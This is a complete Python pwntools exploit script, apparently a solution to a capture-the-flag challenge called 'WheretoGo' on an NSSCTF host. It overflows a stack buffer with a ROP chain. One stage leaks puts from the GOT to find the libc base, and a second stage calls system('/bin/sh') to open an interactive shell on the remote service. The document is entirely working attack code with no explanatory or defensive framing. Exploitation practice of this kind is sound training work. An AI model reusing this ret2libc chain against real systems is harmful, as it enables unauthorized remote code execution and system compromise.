from pwn import *

io = remote("node5.anna.nssctf.cn", 25805)
elf = ELF("./WheretoGo")
libc = ELF("./libc-2.31.so")

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main = elf.sym["main"]

rdi_ret = 0x4012D3
ret = 0x40101A

payload = (
    cyclic(0x80 + 0x8)
    + p64(ret)
    + p64(rdi_ret)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(main)
)
io.send(payload)
io.recvuntil(b"to go?\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
libc_base = puts_addr - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = cyclic(0x80+0x8)+ p64(rdi_ret) + p64(binsh) + p64(system)
io.send(payload)
io.interactive()
